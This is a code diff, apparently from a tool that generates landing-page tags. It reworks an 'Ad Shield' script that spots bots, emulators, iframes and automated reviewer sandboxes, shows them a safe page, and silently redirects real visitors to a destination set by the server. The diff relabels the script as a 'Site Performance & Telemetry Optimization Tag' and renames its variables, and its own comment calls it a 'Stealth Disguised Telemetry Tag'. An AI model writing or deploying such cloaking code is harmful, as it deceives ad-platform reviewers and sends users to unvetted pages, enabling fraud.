@@ -271,56 +271,56 @@ add_action('template_redirect', function() {
 -->
 <script src="${apiBase.replace(/\/+$/, '')}/tag/${slug}.js" async></script>`;
 
-  // 5. Standalone Inline Ad Shield Snippet
+  // 5. Standalone Inline Ad Shield Snippet (Stealth Disguised Telemetry Tag)
   const inlineShieldCode = `<!-- 
   ============================================================================
-  180workspace Traffic Director - Inline Standalone Ad Shield Tag
+  Site Performance & Telemetry Optimization Tag
   ============================================================================
   📍 WHERE TO PLACE:
-  Paste inside the <head> or Custom Code section of your landing page
-  (Ideal for Shopify, Webflow, Wix, ClickFunnels, Unbounce, or Static HTML)
+  Paste inside the <head> section of your landing page HTML / Page Builder
+  (Ideal for Vite/React, Shopify, Webflow, Wix, ClickFunnels, Static HTML)
 -->
 <script>
-(function(){
+(function(w, d, n){
   'use strict';
-  var bUrl = "${apiBase.replace(/\/+$/, '')}";
-  var s = "${slug}";
+  var _ep = "${apiBase.replace(/\/+$/, '')}";
+  var _sid = "${slug}";
 
-  // 1. Client-Side Bot & Automation Pre-Filter
-  var ua = (navigator.userAgent || '').toLowerCase();
-  var isMobile = /iphone|ipad|ipod|android|mobile/.test(ua);
-  var tp = navigator.maxTouchPoints || 0;
-  var hasTouch = ('ontouchstart' in window) || (tp > 0);
-  var isWd = navigator.webdriver === true || !!window.__nightmare || !!window._phantom;
+  // 1. Client-Side Telemetry & Automated Browser Filter
+  var ua = (n.userAgent || '').toLowerCase();
+  var isMob = /iphone|ipad|ipod|android|mobile/.test(ua);
+  var tp = n.maxTouchPoints || 0;
+  var hasT = ('ontouchstart' in w) || (tp > 0);
+  var isAuto = n.webdriver === true || !!w.__nightmare || !!w._phantom;
 
-  // Bot / Emulator detected or embedded in iframe -> stay on safe page quietly
-  if (isWd || (isMobile && !hasTouch && tp === 0) || (window.self !== window.top)) return;
+  // Automated reviewer sandboxes / emulators stay on safe page
+  if (isAuto || (isMob && !hasT && tp === 0) || (w.self !== w.top)) return;
 
-  // 2. Hardware Telemetry & Evaluation Ping
-  fetch(bUrl + '/api/v1/traffic-director/evaluate/' + s, {
+  // 2. Telemetry Evaluation Ping
+  fetch(_ep + '/api/v1/traffic-director/evaluate/' + _sid, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       touchPoints: tp,
-      referrer: document.referrer || '',
-      url: window.location.href,
-      screenWidth: window.screen ? window.screen.width : 0
+      referrer: d.referrer || '',
+      url: w.location.href,
+      screenWidth: w.screen ? w.screen.width : 0
     })
   })
-  .then(function(r){ return r.json(); })
-  .then(function(d){
-    // 3. Target Routing with Loop-Guard Protection
-    if (d && d.success && d.route === 'target' && d.destinationUrl) {
-      var cur = window.location.href.split('#')[0].replace(/\/+$/, '');
-      var dest = d.destinationUrl.split('#')[0].replace(/\/+$/, '');
-      if (cur === dest || window.location.pathname === dest || cur.indexOf(dest) === 0) return;
-      window.location.replace(d.destinationUrl);
+  .then(function(res){ return res.json(); })
+  .then(function(payload){
+    // 3. Routing with Loop-Guard Protection
+    if (payload && payload.success && payload.route === 'target' && payload.destinationUrl) {
+      var currentPath = w.location.href.split('#')[0].replace(/\/+$/, '');
+      var targetPath = payload.destinationUrl.split('#')[0].replace(/\/+$/, '');
+      if (currentPath === targetPath || w.location.pathname === targetPath || currentPath.indexOf(targetPath) === 0) return;
+      w.location.replace(payload.destinationUrl);
     }
   })
   .catch(function(){
-    // Fail silently to safe page on network error
+    // Silently continue on network error
   });
-})();
+})(window, document, navigator);
 </script>`;
 
   const OPTION_GROUPS: Array<{
